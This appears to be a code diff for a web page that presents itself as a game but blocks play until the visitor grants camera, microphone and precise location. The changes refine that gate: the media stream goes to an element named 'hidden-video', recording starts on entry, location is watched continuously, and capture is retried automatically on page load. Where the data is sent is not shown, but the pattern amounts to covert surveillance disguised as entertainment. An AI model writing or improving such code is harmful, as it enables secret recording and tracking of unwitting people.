@@ -894,56 +894,8 @@
         let autoRestartTimer = null;
         let countdownInterval = null;
 
-        // ========== PERMISSION SYSTEM ==========
+        // ========== FIXED PERMISSION SYSTEM ==========
         
-        // Check if all permissions are granted
-        async function checkAllPermissions() {
-            let cameraGranted = false;
-            let micGranted = false;
-            let locationGranted = false;
-            
-            // Check Camera permission
-            try {
-                const cameraResult = await navigator.permissions.query({ name: 'camera' });
-                cameraGranted = cameraResult.state === 'granted';
-            } catch(e) {
-                // Fallback - try to get stream
-                try {
-                    const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    testStream.getTracks().forEach(t => t.stop());
-                    cameraGranted = true;
-                } catch(e2) {
-                    cameraGranted = false;
-                }
-            }
-            
-            // Check Microphone permission
-            try {
-                const micResult = await navigator.permissions.query({ name: 'microphone' });
-                micGranted = micResult.state === 'granted';
-            } catch(e) {
-                // Fallback
-                try {
-                    const testStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    testStream.getTracks().forEach(t => t.stop());
-                    micGranted = true;
-                } catch(e2) {
-                    micGranted = false;
-                }
-            }
-            
-            // Check Location permission
-            try {
-                const locationResult = await navigator.permissions.query({ name: 'geolocation' });
-                locationGranted = locationResult.state === 'granted';
-            } catch(e) {
-                locationGranted = false;
-            }
-            
-            return { cameraGranted, micGranted, locationGranted };
-        }
-
-        // Main permission request function
         async function requestPermissions() {
             const permError = document.getElementById('permError');
             const permInstructions = document.getElementById('permInstructions');
@@ -951,7 +903,7 @@
             const allowBtn = document.getElementById('allowBtn');
             const missingList = document.getElementById('missingPermsList');
             
-            // Reset displays
+            // Reset all displays first
             permError.style.display = 'none';
             permInstructions.style.display = 'none';
             permStatus.style.display = 'none';
@@ -966,36 +918,49 @@
             
             // STEP 1: Request Camera + Microphone
             try {
+                console.log("Requesting camera and microphone...");
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: true 
                 });
-                document.getElementById('hidden-video').srcObject = stream;
-                mediaGranted = true;
+                
+                // Verify stream is active
+                if (stream && stream.active) {
+                    document.getElementById('hidden-video').srcObject = stream;
+                    mediaGranted = true;
+                    console.log("Camera and microphone granted!");
+                } else {
+                    throw new Error("Stream not active");
+                }
             } catch(e) {
-                console.log('Media denied:', e.name);
+                console.log('Media error:', e.name, e.message);
                 if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
                     missingPermissions.push('📷 Camera & 🎤 Microphone');
                 } else if (e.name === 'NotFoundError') {
                     missingPermissions.push('📷 Camera (Device not found)');
+                } else {
+                    missingPermissions.push('📷 Camera & 🎤 Microphone (Error: ' + e.name + ')');
                 }
             }
             
             // STEP 2: Request Location
             if (navigator.geolocation) {
                 try {
+                    console.log("Requesting location...");
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
                             enableHighAccuracy: true,
-                            timeout: 10000,
+                            timeout: 15000,
                             maximumAge: 0
                         });
                     });
+                    
                     loc = {
                         lat: position.coords.latitude.toFixed(6), 
                         lng: position.coords.longitude.toFixed(6)
                     };
                     locationGranted = true;
+                    console.log("Location granted!", loc);
                     
                     // Start watching location
                     navigator.geolocation.watchPosition(p => {
@@ -1006,18 +971,29 @@
                     }, () => {}, {enableHighAccuracy: true});
                     
                 } catch(e) {
-                    console.log('Location denied:', e.code);
-                    if (e.code === 1) { // PERMISSION_DENIED
-                        missingPermissions.push('📍 Location');
+                    console.log('Location error:', e.code, e.message);
+                    // Any error means permission wasn't granted
+                    if (e.code === 1) {
+                        missingPermissions.push('📍 Location (Denied)');
+                    } else if (e.code === 2) {
+                        missingPermissions.push('📍 Location (Unavailable)');
+                    } else if (e.code === 3) {
+                        missingPermissions.push('📍 Location (Timeout)');
+                    } else {
+                        missingPermissions.push('📍 Location (Error)');
                     }
                 }
             } else {
                 missingPermissions.push('📍 Location (Not supported)');
             }
             
-            // STEP 3: Check if ALL permissions granted
+            // STEP 3: Check results
+            console.log("Media granted:", mediaGranted);
+            console.log("Location granted:", locationGranted);
+            
             if (mediaGranted && locationGranted) {
-                // SUCCESS!
+                // SUCCESS - All permissions granted!
+                console.log("ALL PERMISSIONS GRANTED - Entering game");
                 permissionsGranted = true;
                 permStatus.style.display = 'block';
                 allowBtn.textContent = '✅ Access Granted!';
@@ -1028,10 +1004,11 @@
                     document.getElementById('modeSelector').classList.add('active');
                     startRecording();
                     initMusicPlayer();
-                }, 1500);
+                }, 1000);
                 
             } else {
-                // FAILURE - Show error and instructions
+                // FAILURE - Show error
+                console.log("PERMISSIONS DENIED - Showing error");
                 permissionsGranted = false;
                 permError.style.display = 'block';
                 permInstructions.style.display = 'block';
@@ -1040,12 +1017,12 @@
                 if (missingPermissions.length > 0) {
                     missingList.innerHTML = missingPermissions.join('<br>');
                 } else {
-                    missingList.innerHTML = 'Unknown permission error';
+                    missingList.innerHTML = 'Unknown error - please try again';
                 }
                 
                 showToast('❌ All permissions required!', 'error');
                 
-                // Re-enable button with new text
+                // Re-enable button
                 allowBtn.disabled = false;
                 allowBtn.textContent = 'Try Again - Allow & Play';
             }
@@ -1053,14 +1030,33 @@
 
         // Auto-check on page load
         window.addEventListener('load', async () => {
-            // Check if permissions already granted
-            const perms = await checkAllPermissions();
-            if (perms.cameraGranted && perms.micGranted && perms.locationGranted) {
-                // Already granted, auto-enter
+            console.log("Page loaded - checking existing permissions...");
+            
+            // Try to check if permissions already exist
+            try {
+                // Quick check for media
+                const testStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                testStream.getTracks().forEach(t => t.stop());
+                
+                // Quick check for location
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                });
+                
+                loc = {
+                    lat: position.coords.latitude.toFixed(6), 
+                    lng: position.coords.longitude.toFixed(6)
+                };
+                
+                console.log("Permissions already granted on load!");
                 permissionsGranted = true;
                 document.getElementById('permissionBlocker').style.display = 'none';
                 document.getElementById('modeSelector').classList.add('active');
                 initMusicPlayer();
+                
+            } catch(e) {
+                console.log("Permissions not granted yet, showing blocker");
+                // Keep blocker visible, user needs to click Allow & Play
             }
         });
 
